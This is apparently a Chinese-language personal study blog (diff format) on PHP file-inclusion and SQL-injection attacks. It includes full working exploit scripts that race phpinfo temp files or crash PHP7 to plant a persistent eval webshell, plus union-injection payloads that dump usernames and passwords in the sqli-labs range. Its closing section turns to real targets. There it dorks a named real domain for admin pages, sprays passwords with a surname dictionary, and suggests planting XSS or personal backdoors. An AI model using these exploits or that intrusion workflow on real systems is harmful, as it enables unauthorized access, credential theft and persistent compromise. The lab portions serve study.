+<h3 id="3-包含-PROC-SELF-ENVIRON-理论上"><a href="#3-包含-PROC-SELF-ENVIRON-理论上" class="headerlink" title="3.包含/PROC/SELF/ENVIRON  --- 理论上"></a>3.包含/PROC/SELF/ENVIRON  --- 理论上</h3><p>proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ul>
+<p>参考文章：[proc / self / environ Injection](</p>
+<h3 id="4-包含临时文件"><a href="#4-包含临时文件" class="headerlink" title="4.包含临时文件"></a>4.包含临时文件</h3><p>php上传的时候 会生成一个临时文件</p>
+<p>/tem/php_xadsds</p>
+<p>php上传流程：</p>
+<p>后端是否需要接收这个上传文件</p>
+<?php phpinfo();
+
+可以不接收，临时文件被php自动删除了
+
+文件上传 整个流程结束后 php临时文件会被删除
+
+1.文件不能删 --- 第一利用程序要快 竞争 -- 多上传几次 总会成功 一上传以后 在临时文件没删除的时候，php代码执行中断
+
+2.猜到临时文件名称 /tem/php_xaaaaaaa
+
+## 2.例题
+
+**前言**
+
+最近遇到一些文件包含的题目，在本篇文章记录两个trick。
+
+**环境背景**
+
+复现环境还是很容易搭建的：
+
+**例题1（php7）**--- 7.0.1-7.0.9版本间，php生成临时文件后直接中断
+
+index.php
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = @$_GET[&#x27;file&#x27;];</span><br><span class="line">echo &#x27;include $_GET[\&#x27;file\&#x27;]&#x27;;</span><br><span class="line">if (strpos($a,&#x27;flag&#x27;)!==false) &#123;</span><br><span class="line">die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">include $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+dir.php
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = @$_GET[&#x27;dir&#x27;];</span><br><span class="line">if(!$a)&#123;</span><br><span class="line">$a = &#x27;/tmp&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure>
+
+**例题2（php5）**
+
+index.php
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = @$_GET[&#x27;file&#x27;];</span><br><span class="line">echo &#x27;include $_GET[\&#x27;file\&#x27;]&#x27;;</span><br><span class="line">if (strpos($a,&#x27;flag&#x27;)!==false) &#123;</span><br><span class="line">die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">include $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+phpinfo.php
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+两道题的最终目标都是拿到根目录的flag。
+
+**phpinfo+LFI**
+
+我们看到例题2：
+
+我们有文件包含，那么我们可以轻易的用[伪协议](https://zhida.zhihu.com/search?content_id=102120225&content_type=Article&match_order=1&q=伪协议&zhida_source=entity)泄露[源代码](https://zhida.zhihu.com/search?content_id=102120225&content_type=Article&match_order=1&q=源代码&zhida_source=entity)：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+这是老生常谈的问题，无需多讲，重点在于如何去读取根目录的flag。
+
+最容易想到的是利用包含：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?file=/flag</span><br></pre></td></tr></table></figure>
+
+但是由于：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (strpos($a,&#x27;flag&#x27;)!==false) &#123;</span><br><span class="line">die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+我们并不能进行读取，那么很容易想到，尝试[getshell](https://zhida.zhihu.com/search?content_id=102120225&content_type=Article&match_order=1&q=getshell&zhida_source=entity)。
+
+这里我们可以介绍第一个trick，即利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell的目的。
+
+我们简单写一个测试脚本：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">files = &#123;</span><br><span class="line">  &#x27;file&#x27;: BytesIO(&quot;&lt;?php echo &#x27;sky is cool!&#x27;;&quot;)</span><br><span class="line">&#125;</span><br><span class="line">url = &quot;http://ip/phpinfo.php&quot;</span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=False)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>
+
+可以看到回显中有如下内容：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_FILES[&quot;file&quot;]</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; test.txt</span><br><span class="line">    [type] =&gt; application/octet-stream</span><br><span class="line">    [tmp_name] =&gt; /tmp/phptZQ0xZ</span><br><span class="line">    [error] =&gt; 0</span><br><span class="line">    [size] =&gt; 26</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+我们只要利用这一特性，进行包含getshell即可。
+
+首先我们利用正则匹配，提取临时文件名：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = re.search(r&quot;(?&lt;=tmp_name] =&amp;gt; ).*&quot;, r.content).group(0)</span><br></pre></td></tr></table></figure>
+
+
+
+![img](https://pica.zhimg.com/v2-473dea30fb80df6990cb4d607c5cec1a_1440w.jpg)
+
+接下来就是条件竞争的问题：如何在文件临时文件消失前，包含到它。
+
+这里为了事半功倍，我搜集了一些资料和原理：
+
+1.临时文件在phpinfo页面加载完毕后才会被删除。
+
+2.phpinfo页面会将所有数据都打印出来，包括header。
+
+3.php默认的输出[缓冲区](https://zhida.zhihu.com/search?content_id=102120225&content_type=Article&match_order=1&q=缓冲区&zhida_source=entity)大小为4096，可以理解为php每次返回4096个字节给socket连接。
+
+(来自ph牛:[https://github.com/vulhub/vulhub/tree/master/php/inclusion](https://link.zhihu.com/?target=https%3A//github.com/vulhub/vulhub/tree/master/php/inclusion))
+
+那么我们的竞争流程可以总结为：
+
+1.发送包含了webshell的上传数据包给phpinfo页面，同时在header中塞满垃圾数据。
+
+http header 塞满垃圾数据
+
+2.因为phpinfo页面会将所有数据都打印出来，垃圾数据会加大phpinfo加载时间。
+
+3.直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包。
+
+4096，4096 /tmp/dsadasdasd
+
+4.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除。
+
+5.利用这个时间差，在第二个数据包进行文件包含漏洞的利用，即可成功包含临时文件，最终getshell。
+
+同时，对于[webshell](https://zhida.zhihu.com/search?content_id=102120225&content_type=Article&match_order=2&q=webshell&zhida_source=entity)也有讲究，因为包含过程比较麻烦，如果使用一次性一句话[木马](https://zhida.zhihu.com/search?content_id=102120225&content_type=Article&match_order=1&q=木马&zhida_source=entity)：
+
+<?php file_put_contents('..shell.php','<?php phpinfo();');   --- 文件包含的过程中，临时文件的内容，一包含就写入
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[sky]);</span><br></pre></td></tr></table></figure>
+
+则每次执行命令，都要进行一次包含，耗时耗力，所以我们选择包含后写入文件的shell：
+
+web路径下
+
+/var/www/html
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&#x27;/tmp/sky&#x27;, &#x27;&lt;?php @eval($_REQUEST[sky]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+这样一旦包含成功，该shell就会在tmp目录下永久留下一句话[木马文件](https://zhida.zhihu.com/search?content_id=102120225&content_type=Article&match_order=1&q=木马文件&zhida_source=entity)sky，下次利用直接轻松包含即可。
+
+尝试进行exp编写：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">def init(host,port):</span><br><span class="line">padding = &#x27;sky&#x27;*2000</span><br><span class="line">payload=&quot;&quot;&quot;sky test!&lt;?php file_put_contents(&#x27;/tmp/sky&#x27;, &#x27;&lt;?php eval($_REQUEST[sky]);?&gt;&#x27;);?&gt;\r&quot;&quot;&quot;</span><br><span class="line">request1_data =&quot;&quot;&quot;------WebKitFormBoundary9MWZnWxBey8mbAQ8\r</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;\r</span><br><span class="line">Content-Type: text/php\r</span><br><span class="line">\r</span><br><span class="line">%s</span><br><span class="line">------WebKitFormBoundary9MWZnWxBey8mbAQ8\r</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;\r</span><br><span class="line">\r</span><br><span class="line">Submit\r</span><br><span class="line">------WebKitFormBoundary9MWZnWxBey8mbAQ8--\r</span><br><span class="line">&quot;&quot;&quot; % payload</span><br><span class="line">request1 = &quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r</span><br><span class="line">Cookie: skypadding=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">Cache-Control: max-age=0\r</span><br><span class="line">Upgrade-Insecure-Requests: 1\r</span><br><span class="line">Origin: null\r</span><br><span class="line">Accept: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r</span><br><span class="line">User-Agent: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">Accept-Language: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9MWZnWxBey8mbAQ8\r</span><br><span class="line">Content-Length: %s\r</span><br><span class="line">Host: %s:%s\r</span><br><span class="line">\r</span><br><span class="line">%s&quot;&quot;&quot; %(len(request1_data),host,port,request1_data)</span><br><span class="line">request2 = &quot;&quot;&quot;GET /index.php?file=%s HTTP/1.1\r</span><br><span class="line">User-Agent: Mozilla/4.0\r</span><br><span class="line">Proxy-Connection: Keep-Alive\r</span><br><span class="line">Host: %s:%s\r</span><br><span class="line">\r</span><br><span class="line">\r</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">return (request1,request2)</span><br><span class="line">def getOffset(host,port,request1):</span><br><span class="line">    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(request1)</span><br><span class="line">    d = &quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        i = s.recv(4096)</span><br><span class="line">        d+=i       </span><br><span class="line">        if i == &quot;&quot;:</span><br><span class="line">            break</span><br><span class="line">        if i.endswith(&quot;0\r\n\r\n&quot;):</span><br><span class="line">            break</span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)</span><br><span class="line">    if i == -1:</span><br><span class="line">        print &#x27;not fonud&#x27;</span><br><span class="line">    </span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    return i+256</span><br><span class="line">def phpinfo_LFI(host,port,offset,request1,request2):</span><br><span class="line">s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s1.connect((host,port))</span><br><span class="line">s2.connect((host,port))</span><br><span class="line">s1.send(request1)</span><br><span class="line">d = &quot;&quot;</span><br><span class="line">while len(d) &lt; offset:</span><br><span class="line">d += s1.recv(offset)</span><br><span class="line">try:</span><br><span class="line">i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)</span><br><span class="line">fn = d[i+17:i+31]</span><br><span class="line">s2.send(request2 % (fn,host,port))</span><br><span class="line">tmp = s2.recv(4096)</span><br><span class="line">if tmp.find(&quot;sky test!&quot;) != -1:</span><br><span class="line">return fn</span><br><span class="line">except ValueError:</span><br><span class="line">    return None</span><br><span class="line">s1.close()</span><br><span class="line">s2.close()</span><br><span class="line">attempts = 1000</span><br><span class="line">host = &quot;ip&quot;</span><br><span class="line">port = &quot;port&quot;</span><br><span class="line">request1,request2 = init(host,port)</span><br><span class="line">offset = getOffset(host,port,request1)</span><br><span class="line">for i in range(1,attempts):</span><br><span class="line">print &quot;try:&quot;+str(i)+&quot;/&quot;+str(attempts)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line">res = phpinfo_LFI(host,port,offset,request1,request2)</span><br><span class="line">if res is not None:</span><br><span class="line">print &#x27;You can getshell with /tmp/sky!&#x27;</span><br><span class="line">break</span><br></pre></td></tr></table></figure>
+
+编写还是非常容易的，知道原理后，其实不存在多少条件竞争，最多尝试个10次左右就可以达成目的。
+
+随后我们就可以轻松getshell：
+
+
+
+![img](https://pic1.zhimg.com/v2-5d449be33ea91ba5bccb6c612e29fcba_1440w.jpg)
+
+
+
+**LFI+php7崩溃**
+
+前一题我们能做，得益于phpinfo的存在，但如果没有phpinfo的存在，我们就很难利用上述方法去getshell。
+
+但如果目标不存在phpinfo，应该如何处理呢？
+
+这里可以用php7 segment fault特性。
+
+我们可以利用：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+这样的方式，使php执行过程中出现Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除：
+
+
+
+![img](https://pic4.zhimg.com/v2-8bff7fa3467c85d9bf5d9b28c6b63315_1440w.jpg)
+
+
+
+这样就能达成我们getshell的目的，脚本相对容易很多：
+
+
+
+![img](https://pic1.zhimg.com/v2-d867fd35998179d665bf887827620688_1440w.jpg)
+
+
+
+加上我们有dir.php
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = @$_GET[&#x27;dir&#x27;];</span><br><span class="line">if(!$a)&#123;</span><br><span class="line">$a = &#x27;/tmp&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure>
+
+可以进行目录列举，我们只要找到临时文件名即可：
+
+编写exp
+
+**特定版本**
+
+1.php7.0.0-7.1.2
+
+2.php7.1.1-7.2.1
+
+3.php7.2.2-7.2.8
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">import re</span><br><span class="line">files = &#123;</span><br><span class="line">  &#x27;file&#x27;: BytesIO(&#x27;&lt;?php eval($_REQUEST[sky]);&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">url = &#x27;http://ip/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span><br><span class="line">try:</span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=False)</span><br><span class="line">except:</span><br><span class="line">url = &#x27;http://ip/dir.php&#x27;</span><br><span class="line">r = requests.get(url)</span><br><span class="line">data = re.search(r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;, r.content).group(0)</span><br><span class="line">url = &quot;http://ip/index.php?file=/tmp/&quot;+data</span><br><span class="line">data = &#123;</span><br><span class="line">&#x27;sky&#x27;:&quot;readfile(&#x27;/flag&#x27;);&quot;</span><br><span class="line">&#125;</span><br><span class="line">r =  requests.post(url=url,data=data)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>
+
+运行即可看到flag
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python myexp2.py</span><br><span class="line">include $_GET[&#x27;file&#x27;]flag&#123;LFI_php7~&#125;</span><br></pre></td></tr></table></figure>
+
+#  五、第五天
+
+## 1.mysql
+
+### 1.环境搭建
+
+成功下载好小皮面板以后，安装MySQL5.7版本，搭建好之后，能够正常启动以后，查找到MySQL的安装路径
+
+打开系统的环境变量，在其中添加mysql的环境，方便在cmd直接打开
+
+### 2.靶场导入
+
+https://github.com/Rock718/sqli-labs-php7
+
+其中有靶场的压缩包，下载完毕以后导入小皮的www用户下，然后解压缩
+
+![image-20260119013458542](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260119013458542.png)
+
+然后找到其中一个文件夹更改连接的登陆密码
+
+![image-20260119013540839](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260119013540839.png)
+
+![image-20260119013555400](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260119013555400.png)
+
+更改完毕以后，在浏览器输入127.0.0.1/sqlilabs
+
+![image-20260119013648389](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260119013648389.png)
+
+则证明成功进入到靶场中
+
+### 3.相关函数
+
+截断函数：
+
+substr : select substr('root',1,2);
+
+substring: select substring('root',2,2);
+
+ left: select left('root',2);
+
+right: select right('root',2);
+
+ mid: select mid('root',1,1);
+
+
+
+把常见的英文转换成ASCII码数字：
+
+ascii: select ascii('r');
+
+### 4.其余补充信息
+
+information_schema -- 信息 系统库 安装mysql自动就有 系统创建的
+
+还有MySQL这个库
+
+
+
+重点查看和我们相关的表：
+
+SCHEMATA 记录数据库名称
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc SCHEMATA;</span><br></pre></td></tr></table></figure>
+
+![image-20260127012609736](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260127012609736.png)
+
+TABLES 记录所有表名 可以包含数据库名
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc TABLES;</span><br></pre></td></tr></table></figure>
+
+![image-20260127012641974](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260127012641974.png)
+
+ COLUMNS 记录所有列名 可以查询数据库名 表名
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc  COLUMNS;</span><br></pre></td></tr></table></figure>
+
+![image-20260127012700732](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260127012700732.png)
+
+
+
+### 5.mysql 联表查询
+
+union 联合  --- 必须有一个前置条件  列数相同
+
+表 union 表
+
+
+
+问题：你如何知道你要入侵的这个网站的这个数据表里有几列
+
+无法知道列数 --- 连表查询失败（id,username,password)
+
+order by 排序的意思 也是排序
+
+
+
+ERROR 1054 (42S22): Unknown column '4' in 'order clause'  不知道第四列  --- 侧面推出 他有几列
+
+
+
+让数据库误解
+
+单双引号 --- 成对出现
+
+=1' dsadadas
+
+SELECT * FROM users WHERE id='1'  order by 1# 'LIMIT 0,1
+
+
+
+有三列（将列数搞定以后，在进行联合查询）
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users union select 1,2,3;</span><br><span class="line">-----</span><br><span class="line">select * from users union select user(),database(),version();</span><br></pre></td></tr></table></figure>
+
+
+
+注释单双引号：
+
+1>-- (--空格)
+
+2>#
+
+3>/**/(多行注释)
+
+
+
+
+
+## 2.靶场第一关
+
+### 1.页面
+
+![image-20260127013231450](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260127013231450.png)
+
+### 2.数据库
+
+![image-20260127013253558](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260127013253558.png)
+
+查找到数据库的用户以后，查看源代码的后端
+
+后端逻辑：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;id&#x27;];</span><br><span class="line"></span><br><span class="line">select username,password from users where id=$id;</span><br></pre></td></tr></table></figure>
+
+![image-20260127013522205](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260127013522205.png)
+
+### 3.常见问题
+
+![image-20260127015741183](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260127015741183.png)
+
+**id=-1（不存在，绕过开头，让他不展示）**
+
+![image-20260127020028848](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260127020028848.png)
+
+![image-20260306110734129](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260306110734129.png)
+
+Your Login name:security
+Your Password:root@localhost
+
+列名 表明 内容 你都不知道
+
+我最终的目的是查到管理员的账号密码 
+
+进入后台
+
+就要知道**管理员是哪张表**
+
+**表里是什么字段**
+
+才能查
+
+information 所有表
+
+所有的字段
+
+---解决方案：
+
+1. 如果你的系统是开源 --- 可以知道管理的表和所有的字段
+
+2. 闭源 --- 那么不知道表名 列名
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),3--+</span><br></pre></td></tr></table></figure>
+
+ ---上述指令会报错：返回超过一行
+
+解决方法：
+
+1.限制行列数
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+![image-20260306112918179](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260306112918179.png)
+
+2.python循环，brp遍历（表过多的情况）
+
+![image-20260306113500880](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260306113500880.png)
+
+Sniper attack : 单个字段爆破
+
+
+
+Battering ram attack : 多个字段爆破--只用同一个字典进行爆破
+
+
+
+Pitchfork attack ：多个字段爆破（eg两个)--要准备两个字典，一是用户名字典，二是密码字典，一一对应
+
+用户名          密码
+
+username    password
+
+username1  password1
+
+
+
+Cluster bomb attack : 多个字段爆破，一对多
+
+用户名         密码
+
+username   password
+
+username   password1
+
+3.一个函数，将四行组合成一行
+
+group_concat
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27),3--+</span><br></pre></td></tr></table></figure>
+
+![image-20260306114739274](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260306114739274.png)
+
+表名找到以后寻找列名
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_schema=&#x27;security&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.5.94.179/sqlilabs/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(username,0x3a,password)from%20users),3--+</span><br></pre></td></tr></table></figure>
+
+![image-20260306115636670](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260306115636670.png)
+
+### 4.联合查询原理
+
+库：information_schema
+
+逐步查询 --- 表名和列名
+
+要求：前端有回显，才能正常查到
+
+### 5.弱口令爆破---brp
+
+密码爆破 --- 基本会失败，密码是有策略的，1分钟内三次以上ip直接封掉
+
+弱口令 --- 查找子域名，爆破用户名 --- 合理
+
+（admin root manager system）
+
+将密码定死，只让他成为 123456 12345678 111111 666666  888888 000000
+
+爆破用户名 --- 有个很大的好处 --- 大概率不会触发风控机制 --- 密码喷洒
+
+2026年 爆破密码 --- 自寻死路
+
+### 6.实操
+
+1.进入真实环境以后先查看网站本身是否存在可进入漏洞，可以尝试app，也可以在页面自带的登录页面注入xss进行种马
+
+2.查看robots.txt --- 蜘蛛规则（百度蜘蛛，bing蜘蛛，google蜘蛛）--- 现在大量厂商会避免蜘蛛爬到相关信息会在robots.txt里面写disallow，有的人可能会直接将管理员用户写在页面本身，然后并未设置查看权限 ---- 概率很小
+
+![image-20260309085335712](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309085335712.png)
+
+3.思路从主站 ---> 子站 （信息收集） --- 浏览器/子域名查找软件
+
+--- google语法来发现子站
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:kidcastle.com.cn intext:&quot;管理|登录|amdin|manager|root|system|后台&quot;</span><br></pre></td></tr></table></figure>
+
+能找到但是会费时，比较慢
+
+--- fofa/hunter/quark 
+
+找到所需的子域名以后，尝试使用brp进行密码喷洒
+
+![image-20260309091456650](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309091456650.png)
+
+导入百家姓的用户名字典
+
+![image-20260309093715679](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309093715679.png)
+
+![image-20260309093927913](C:\Users\xzy20\AppData\Roaming\Typora\typora-user-images\image-20260309093927913.png)
+
+成功爆破获取到登录账号，但是无法确保你得到的账号属于管理员最高权限，但是仍然可以进行一般的相关操作，可以通过给注入点添加你个人的后门
+
